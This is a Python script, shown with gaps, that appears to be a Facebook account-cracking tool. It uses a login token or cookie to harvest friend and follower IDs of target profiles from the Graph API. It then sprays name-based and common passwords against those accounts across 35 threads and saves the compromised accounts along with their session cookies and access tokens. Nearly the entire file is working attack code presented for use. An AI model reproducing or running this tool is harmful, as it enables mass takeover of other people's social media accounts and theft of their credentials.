...
def ___login___():
    os.system('clear')
    print(___logo___)
    print("%s[%s1%s]%s Login With Token(Best He JANII)"%(B,P,B,P))
    print("%s[%s2%s]%s Login With Cookie"%(B,P,B,P))
    print("%s[%s3%s]%s How To Get Token"%(B,P,B,P))
    print("%s[%s4%s]%s Direct Exit"%(K,P,K,P))
...
def ___menu___():
    ...
    try:
        ...
        print("%s[%sâ€¢%s]%s HELLO JANII :%s %s"%(B,P,B,P,H,xoz['name']))
        try:
        ...
        exit("%s[%s!%s]%s CONNECTION LOL HAI"%(P,M,P,M))
    print("\n%s[%s1%s]%s DUMP PUBLIC ID ALL (2004-2021)"%(H,U,H,P))
    print("%s[%s2%s]%s DUMP PUBLIC ID OLD (2009-2006)"%(H,U,H,P))
    print("%s[%s3%s]%s DUMP PUBLIC ID NEW (2020-2021)"%(H,U,H,P))
    print("%s[%s4%s]%s DUMP PUBLIC ID VERY OLD(2006-2009)"%(H,U,H,P))
    print("%s[%s5%s]%s DUMP PUBLIC ID'S FOLLOWERS OLD (2015-2006)"%(H,U,H,P))
    print("%s[%s6%s]%s DUMP PUBLIC ID'S FOLLOWERS NEW (2021-2020)"%(H,U,H,P))
    print("%s[%s7%s]%s DUMP PUBLIC ID FREINDS+TTL (2021-2004)"%(H,U,H,P))
    print("%s[%s8%s]%s DUMP PUBLIC ID OLD (2006-2015)"%(H,U,H,P))
    print("%s[%s9%s]%s DUMP PUBLIC ID NEW (2022-2020)"%(H,U,H,P))
    print("%s[%s10%s]%s START CRACKING %s[%sFast%s/%sSlow%s]"%(B,U,B,P,K,H,K,H,K))
    print("%s[%s11%s]%s CHECK CRACK RESULT"%(H,U,H,P))
    print("%s[%s12%s]%s CONTACT ME ON FB"%(H,U,H,P))
    print("%s[%s13%s]%s LOGOUT TOKEN"%(H,U,H,P))
    ___menu___ = raw_input("\n%s[%s?%s]%s WHATS YOUR CHOICE?  :%s "%(B,H,B,P,K))
    if ___menu___ in ['1','01']:
        ...
        print("\n%s[%s1%s]%s CHECK HANNAN OK.txt"%(B,P,B,P))
        print("%s[%s2%s]%s CHECK HANNAN CP.txt"%(B,P,B,P))
        print("%s[%s3%s]%s BACK"%(B,K,B,P))
        ___hasilz___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___hasilz___ in ['1','01']:
            try:
                ___ok___ = open('Results/Ok.txt','r').read()
            except (IOError):
                exit("%s[%s!%s]%s THERE IS NO IDS OF HANNANOK.txt"%(P,M,P,M))
            print("%s "%(P))
            os.system('cat Results/Ok.txt')
            print("\n%s[%s*%s]%s Total Hannanok.txt :%s %s"%(B,P,B,P,H,len(open('Results/Ok.txt','r').readlines())))
        elif ___hasilz___ in ['2','02']:
            try:
                ___cp___ = open('Results/Cp.txt','r').read()
            except (IOError):
                exit("%s[%s!%s]%s NO IDS TO SHOW OF HANNANCP.txt"%(P,M,P,M))
            print("%s "%(P))
            os.system('cat Results/Cp.txt')
            print("\n%s[%s*%s]%s Total Ids Of HANNAN Cp.txt:%s %s"%(B,P,B,P,H,len(open('Results/Cp.txt','r').readlines())))
...
def ___masal___():
    try:
        ...
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___total___ = int(raw_input("\n%s[%s?%s]%s How Many Ids You want To Crack :%s "%(B,P,B,P,H)))
    except:
        ___total___ = 1
    ___file___ = raw_input("%s[%s?%s]%s Name of File :%s "%(B,P,B,P,H))
    for zx in range(___total___):
        zx +=1
        ___ids___ = raw_input("%s[%s%s%s]%s TARGET  :%s "%(B,P,zx,B,P,H))
        print(" ")
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s ID DAAL PAGAL"%(P,M,P,M))
        try:
            ...
            for a in rex['friends']['data']:
                file.write(a['id']+"=[HANNAN]="+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"=[HANNAN]="+a['name'])
            file.close()
            ___user___ = open(___file___,'r').readlines()
            print("\r%s                    "%(P))
            print("%s[%s*%s]%s SUCCESS..."%(H,P,H,P))
            print("%s[%s?%s]%s TOTAL IDS :%s %s"%(H,P,H,P,K,len(___user___)))
            print("%s[%s?%s]%s FILE SAVE WITH%s %s"%(H,P,H,P,K,___file___))
            raw_input("\n%s[%s BACK%s]"%(B,H,B));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s DUMP FAILED"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s CONNECTION LOL HE JANII"%(P,K,P,K))
# Masal Old
def ___masal2___():
    try:
        ___token___ = open('login.txt','r').read()
        ...
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___total___ = int(raw_input("\n%s[%s?%s]%s NUMBER OF IDS? :%s "%(B,P,B,P,H)))
    except:
        ___total___ = 1
    ___file___ = raw_input("%s[%s?%s]%s SAVE AS :%s "%(B,P,B,P,H))
    for zx in range(___total___):
        zx +=1
        ___ids___ = raw_input("%s[%s%s%s]%s User :%s "%(B,P,zx,B,P,H))
        print(" ")
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s LAKH LAANAT"%(P,M,P,M))
        try:
            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
            file = open(___file___ , 'a')
            for a in rex['friends']['data']:
            ...
            print("%s[%s?%s]%s FILE SAVED :%s %s"%(H,P,H,P,K,___file___))
            raw_input("\n%s[%BACK%s]"%(B,H,B));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s FAILED"%(P,M,P,M))
        except (ConnectionError):
...
def ___masal3___():
    try:
        ...
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___total___ = int(raw_input("\n%s[%s?%s]%s Numbers Of id:%s "%(B,P,B,P,H)))
    except:
        ___total___ = 1
...
def ___follower___():
    ...
    try:
        ___ids___ = raw_input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s past an id stupid"%(P,M,P,M))
        oxo = requests.get("https://graph.facebook.com/%s?access_token=%s"%(___ids___,___token___)).json()
        print("%s[%s*%s]%s name :%s %s"%(B,P,B,P,H,oxo['name']))
        ___file___ = oxo['name'].replace(' ','_') + '.json'
        print(" ")
...
def ___follower2___():
    ...
    try:
        ...
        oxo = requests.get("https://graph.facebook.com/%s?access_token=%s"%(___ids___,___token___)).json()
        print("%s[%s*%s]%s name :%s %s"%(B,P,B,P,H,oxo['name'].lower()))
        ___file___ = oxo['name'].replace(' ','_') + '.json'
        print(" ")
    except (KeyError):
        exit("%s[%s!%s]%s User Not Found"%(P,M,P,M))
...
def ___metode___():
    ...
    if ___metode___ in ['1','01']:
        print("\n%s[%s1%s]%s Crack With Password [name,name123,name12345]"%(H,P,H,P))
        print("%s[%s2%s]%s Crack With Password [name,name123,name1234,name12345,name123456]"%(H,P,H,P))
        print("%s[%s3%s]%s Crack With Password [name,name123,name1234,name12345,Sayang,Dll]"%(H,P,H,P))
        print("%s[%s4%s]%s Crack With Password Manual [ >6 ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n%s[%s*%s]%s Crack With Manual Passwords"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Cant Less Than 6 Character"%(P,M,P,M))
        try:
        ...
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                ...
                if ___password___ in ['1','01']:
                    ...
                    pwx = [name, ox[0]+'123', ox[0]+'12345', 'Sayang', 'Anjing', 'Bangsat', 'Kontol', 'Bismillah', '123456', 'Cantik']
        ...
        exit("\n%s[%sSUCCESSFULL%s]"%(B,H,P))
    elif ___metode___ in ['2','02']:
        print("\n%s[%s1%s]%s Crack With Password [name,name123,name12345,Bangladesh,001122]"%(H,P,H,P))
        print("%s[%s2%s]%s Crack With Password [name,name123,name1234,786786,name12345,name123456,Pakistan]"%(H,P,H,P))
        print("%s[%s3%s]%s Crack With Password [name,name123,name1234,name12345,Sayang,Dll]"%(H,P,H,P))
        print("%s[%s4%s]%s Crack With Password Manual [ >6 ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n[*] Crack With Manual Passwords"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Cant Less Than 6 Character"%(P,M,P,M))
        try:
        ...
        try:
            ...
            exit("%s[%s!%s]%s File Not Found"%(P,M,P,M))
        print("\n%s[%sâ€¢%s]%s HANNAN OK :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sâ€¢%s]%s HANNAN OK :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Crack With Auto Passwords 1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, name = user.split('=[HANNAN]=')
        ...
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n[*] Cracking With Manual Passwords"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Cant Less Then 6 Character"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
    ...
    try:
        for pw in pwx:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                print("\r\x1b[1;92m[HANNAN-SUCCESS] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[HANNAN-CHECK]%s|%s\x1b[1;97m       "%(uid, pw))
    ...
    try:
        for pw in pwx:
            ...
            if 'session_key' in send.text and 'EAAA' in send.text:
                print("\r\x1b[1;92m[HANNAN-SUCCESS] %s|%s %s\x1b[1;97m"%(uid, pw, send.json()['access_token']))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
